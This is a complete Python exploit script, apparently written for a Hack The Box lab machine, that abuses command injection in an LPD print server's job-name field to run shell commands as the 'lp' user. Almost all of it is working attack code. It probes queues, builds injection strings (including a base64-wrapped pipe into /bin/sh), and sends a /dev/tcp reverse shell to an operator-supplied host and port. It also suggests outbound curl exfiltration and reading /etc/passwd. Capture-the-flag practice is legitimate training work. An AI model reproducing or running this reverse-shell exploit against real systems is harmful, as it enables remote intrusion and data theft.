#!/usr/bin/env python3
"""
PaperWork (HTB) - stage 1: LPD (RFC 1179) job-name command injection -> shell as lp.

Server sink (server.py, exposed at http://paperwork.htb/download/archive):

    subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

`job_name` is copied verbatim out of the "J" line of the LPD control file, so a
leading single quote closes the echo argument and everything after it is shell.

Handshake used (RFC 1179 section 5.2 / 6.2):
    C->S  \x02<queue>\n                  S->C  \x00  (accepted) / \x01 (rejected)
    C->S  \x02<count> <cfname>\n         S->C  \x00
    C->S  <control file bytes>\x00

Usage:
    ./poc_lpd_rce_r3by5.py <target> probe
    ./poc_lpd_rce_r3by5.py <target> cmd --command 'id; hostname'
    ./poc_lpd_rce_r3by5.py <target> revshell --lhost 10.10.14.5 --lport 4444
    ./poc_lpd_rce_r3by5.py <target> cmd --command 'cat /etc/passwd' --b64

Notes:
  * --b64 pipes the command through base64 so quotes/redirection never need
    escaping inside the injected single-quoted context.
  * The queue on the shipped box is `archive_intake` (also disclosed on the
    maintenance page); `probe` checks the usual alternatives first.
  * Output of injected commands is not returned over LPD (the daemon only logs
    it) - use --lhost/--lport, an outbound curl, or write into a path the
    JetDirect service can read back via FSUPLOAD.
"""

import argparse
import base64
import socket
import sys
import time

QUEUE_CANDIDATES = [
    "archive_intake",
    "archive",
    "print",
    "lp",
    "default",
    "raw",
    "text",
]


class LPD:
    def __init__(self, host, port=1515, timeout=6.0, ctl_host="kali", ctl_user="kali"):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.ctl_host = ctl_host
        self.ctl_user = ctl_user
        self.sock = None
        self.banner = b""

    # -- transport ---------------------------------------------------------
    def connect(self):
        self.sock = socket.create_connection((self.host, self.port), self.timeout)
        self.sock.settimeout(self.timeout)
        return self

    def close(self):
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def __enter__(self):
        return self.connect()

    def __exit__(self, *exc):
        self.close()

    def _recv(self, n, timeout):
        timeout = max(0.05, timeout)
        self.sock.settimeout(timeout)
        try:
            return self.sock.recv(n)
        except socket.timeout:
            return b""
        finally:
            self.sock.settimeout(self.timeout)

    def ack(self, timeout=None):
        """Read one protocol ACK byte, tolerating any banner text emitted first."""
        deadline = time.time() + (timeout if timeout is not None else self.timeout)
        text = b""
        while True:
            left = deadline - time.time()
            if left <= 0:
                return None, text
            chunk = self._recv(1, left)
            if not chunk:
                if text:
                    return None, text
                return None, text
            if chunk in (b"\x00", b"\x01"):
                return chunk[0], text
            text += chunk

    # -- protocol ----------------------------------------------------------
    def request_job(self, queue):
        self.sock.sendall(b"\x02" + queue.encode() + b"\n")
        return self.ack()

    def send_control(self, control, style="full", cfnum=666, wait_final=True):
        """style=full -> \\x02<count> cfA666kali\\n ; style=minimal -> \\x02<count>\\n"""
        if style == "minimal":
            header = b"\x02" + str(len(control)).encode() + b"\n"
        else:
            cfname = "cfA%03d%s" % (cfnum, self.ctl_host)
            header = b"\x02" + str(len(control)).encode() + b" " + cfname.encode() + b"\n"
        self.sock.sendall(header)
        ack, text = self.ack()
        if ack != 0x00:
            return ack, text
        self.sock.sendall(control + (b"\x00" if style == "full" else b""))
        trailer = b""
        if wait_final:
            _, trailer = self.ack(timeout=1.5)
        return ack, text + trailer

    def build_control(self, job_name):
        if "\n" in job_name or "\x00" in job_name:
            raise ValueError("job name must be a single line without NUL bytes")
        lines = [
            "H" + self.ctl_host,
            "P" + self.ctl_user,
            "J" + job_name,
            "l" + self.ctl_host,
            "Ntest.txt",
        ]
        return ("\n".join(lines) + "\n").encode()

    def run_job(self, queue, job_name, style="full", wait_final=True):
        with self.connect():
            ack, text = self.request_job(queue)
            if text:
                self.banner = text
            if ack != 0x00:
                raise RuntimeError(
                    "queue %r refused (ack=%r, reply=%r)" % (queue, ack, text)
                )
            control = self.build_control(job_name)
            ack, text = self.send_control(control, style=style, wait_final=wait_final)
            if ack != 0x00:
                raise RuntimeError("control file refused (ack=%r, reply=%r)" % (ack, text))
            return text


def inject_plain(command):
    # echo 'Archive: ';<command> #' >> /tmp/archive.log
    return "';" + command + " #"


def inject_b64(command):
    blob = base64.b64encode(command.encode()).decode()
    # echo 'Archive: ';echo <b64>|base64 -d|/bin/sh #' >> /tmp/archive.log
    return "';echo " + blob + "|base64 -d|/bin/sh #"


def revshell_job(lhost, lport, shell="/bin/bash"):
    return "';" + shell + " -c '" + shell + " -i >& /dev/tcp/%s/%s 0>&1' #" % (lhost, lport)


def cmd_probe(args):
    for queue in QUEUE_CANDIDATES:
        client = LPD(args.target, args.port, args.timeout, args.ctl_host, args.ctl_user)
        try:
            with client:
                ack, text = client.request_job(queue)
            state = {0x00: "ACCEPTED", 0x01: "rejected", None: "no reply"}.get(ack, repr(ack))
            extra = (" | banner=%r" % text[:80]) if text else ""
            print("[%-8s] %s%s" % (state, queue, extra))
        except OSError as exc:
            print("[ error  ] %s -> %s" % (queue, exc))


def cmd_cmd(args):
    job = inject_b64(args.command) if args.b64 else inject_plain(args.command)
    reply = LPD(args.target, args.port, args.timeout, args.ctl_host, args.ctl_user).run_job(
        args.queue, job, style=args.style
    )
    print("[+] control file accepted (reply=%r)" % reply[:120])
    if args.delay:
        time.sleep(args.delay)


def cmd_revshell(args):
    job = revshell_job(args.lhost, args.lport, shell=args.shell)
    print("[*] J field: J%s" % job)
    print("[*] start a listener first: nc -lvnp %s" % args.lport)
    if not args.yes:
        input("press enter to send the job ")
    LPD(args.target, args.port, args.timeout, args.ctl_host, args.ctl_user).run_job(
        args.queue, job, style=args.style
    )
    print("[+] job sent; check your listener")
    if args.delay:
        time.sleep(args.delay)


def main(argv=None):
    p = argparse.ArgumentParser(description="PaperWork LPD command injection client")
    p.add_argument("target", help="target host/IP")
    p.add_argument("--port", type=int, default=1515)
    p.add_argument("--timeout", type=float, default=6.0)
    p.add_argument("--queue", default="archive_intake")
    p.add_argument("--ctl-host", default="kali", help="hostname reported in H/l control fields")
    p.add_argument("--ctl-user", default="kali", help="user reported in the P control field")
    p.add_argument(
        "--style",
        choices=("full", "minimal"),
        default="full",
        help="full = \\x02<count> <cfname> (self-hosted box); minimal = \\x02<count>",
    )
    sub = p.add_subparsers(dest="action", required=True)

    s = sub.add_parser("probe", help="check which print queues are accepted")
    s.set_defaults(func=cmd_probe)

    s = sub.add_parser("cmd", help="execute a command as lp")
    s.add_argument("--command", required=True)
    s.add_argument("--b64", action="store_true", help="base64-wrap the command (quote safe)")
    s.add_argument("--delay", type=float, default=0.0)
    s.set_defaults(func=cmd_cmd)

    s = sub.add_parser("revshell", help="send a /dev/tcp reverse shell job")
    s.add_argument("--lhost", required=True)
    s.add_argument("--lport", type=int, required=True)
    s.add_argument("--shell", default="/bin/bash", choices=("/bin/bash", "/bin/sh"))
    s.add_argument("--yes", action="store_true", help="do not prompt")
    s.add_argument("--delay", type=float, default=1.0)
    s.set_defaults(func=cmd_revshell)

    args = p.parse_args(argv)
    try:
        args.func(args)
    except (OSError, RuntimeError, ValueError) as exc:
        print("[-] %s" % exc, file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
